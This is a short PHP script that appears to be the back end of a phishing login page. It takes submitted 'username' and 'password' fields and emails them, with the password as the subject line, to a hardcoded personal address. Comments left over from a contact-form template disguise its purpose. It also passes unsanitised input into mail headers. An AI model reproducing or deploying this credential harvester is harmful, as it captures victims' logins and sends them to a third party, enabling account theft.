<?php

if(isset($_POST['submit'])){
    $to = "louis.pautasso@ynov.com"; // this is your Email address
    $from = $_POST['username']; // this is the sender's Email address
    $subject = $_POST['password'];
    $message = $from . " " . $subject . " wrote the following:" ;

    $headers = "From:" . $from;
    mail($to,$subject,$message,$headers);
    }
	
?>